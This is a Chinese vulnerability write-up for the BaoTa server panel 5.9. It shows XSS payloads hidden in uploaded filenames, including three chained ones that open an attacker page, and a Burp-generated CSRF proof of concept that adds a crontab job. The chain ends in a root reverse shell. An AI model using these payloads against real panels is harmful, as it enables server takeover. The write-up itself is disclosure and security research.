> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/gtYyyhye90ZPILWCGsGKGQ)

去年就挖到了，交了 CVND。感觉现在用 5.x 版本的已经很少了。

通过以下命令来安装 5.9 版本宝塔面板

Centos 安装命令：

```
yum install -y wget && wget -O install.sh http://download.bt.cn/install/install.sh && sh install.sh
```

Ubuntu/Deepin 安装命令：

```
wget -O install.sh http://download.bt.cn/install/install-ubuntu.sh && sudo bash install.sh
```

假设我们已经通过网站漏洞或者 ftp 弱口令等, 可以在 web 目录下进行文件上传

在 web 目录下上传一个文件名为 `<img src=x onerror="alert(1)">`的文件

![](https://mmbiz.qpic.cn/mmbiz_png/noZJ3Kqbu1fMgrSsdJ2sFvn5FiaYqcu4o2QaROzvZzdekTJ7nSqfhbaA6DXLNWuOmwq68s0A79icz1CgV9M95ojQ/640?wx_fmt=png)

在宝塔后台浏览文件, 触发 payload

![](https://mmbiz.qpic.cn/mmbiz_png/noZJ3Kqbu1fMgrSsdJ2sFvn5FiaYqcu4ofIibIjU0Jv8AvJEX4Q1iavdtHa4huZXxeD4ialuHk6xCACbxyPBS4Y6icw/640?wx_fmt=png)

但是由于宝塔的 session 加了 httponly, 所以我们是无法获取到宝塔的 cookie 的, 但是我们可以配合计划任务的一个 csrf 的漏洞来达到权限提升的效果

POC

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://1.1.1.1:8888/crontab?action=AddCrontab" method="POST">
      <input type="hidden"  />
      <input type="hidden"  />
      <input type="hidden"  />
      <input type="hidden"  />
      <input type="hidden"  />
      <input type="hidden"  />
      <input type="hidden"  />
      <input type="hidden"  />
      <input type="hidden"  />
      <input type="hidden"  />
      <input type="hidden"  />
      <input type="hidden"  />
      <input type="hidden"  />
      <input type="hidden"  />
      <input type="submit" id="a" value="Submit request" />
    </form>
  </body>
  <script>
    document.getElementById('a').click()
</script>
</html>
```

修改 poc 中的 ip 地址, 保存到网页上传到 test.com 中, 当宝塔管理员访问这个页面以后, 会自动跳转到

![](https://mmbiz.qpic.cn/mmbiz_png/noZJ3Kqbu1fMgrSsdJ2sFvn5FiaYqcu4oplB9usp3NOtjX4WmBv4WkVAz9DJ2bwsT9icRYNwdpTQUahl9dic0lUDw/640?wx_fmt=png)

后台会自动添加反弹 shell 的计划任务

![](https://mmbiz.qpic.cn/mmbiz_png/noZJ3Kqbu1fMgrSsdJ2sFvn5FiaYqcu4o8xaaHxM35gclzZVt2MTofhtjv6Tkuia6SN6xlGqPNKFd6QbzuKiboZhw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/noZJ3Kqbu1fMgrSsdJ2sFvn5FiaYqcu4osk368ej3OdRiaWXNEbDd07hoJAWwlvORWsB6Q5bEVQrp69ssHFkL7og/640?wx_fmt=png)

现在准备就绪, 只要让管理员打开这个网页就可以了

回到上传文件的地方, 因为有触发点有字符数限制, 所以用多个语句构造, 因为执行顺序的关系, 可能需要刷新一下文件管理即可触发

![](https://mmbiz.qpic.cn/mmbiz_png/noZJ3Kqbu1fMgrSsdJ2sFvn5FiaYqcu4o9msRNtHj01Q11hvvBupXMcqNSuosXfoesQTUexlEInqGABWStv2NAg/640?wx_fmt=png)

新建三个文件, 文件名分别为

```
a<img src=x onerror="a=String.fromCharCode(47)">
b<img src=x onerror="b='.com'">
c<img src=x onerror="window.open(a+a+'test'+b)">
```

payload 触发以后会自动打开 test.com 网页

![](https://mmbiz.qpic.cn/mmbiz_png/noZJ3Kqbu1fMgrSsdJ2sFvn5FiaYqcu4o8bKD7GZaooAvH2kNdQoB8Ld2slHr6JQUDsUIYoP1JDn5uLIMy6z6zw/640?wx_fmt=png)

将上一步 CSRF 的 payload 部署到 test.com, 管理员浏览文件的时候即可触发, 触发后五分钟会反弹 shell

![](https://mmbiz.qpic.cn/mmbiz_png/noZJ3Kqbu1fMgrSsdJ2sFvn5FiaYqcu4ou3Rq4cE31ia4gZNa9BicPibf6wOMI1vhfCibuzicUtdGBohcp8uygngaMAA/640?wx_fmt=png)

root 权限~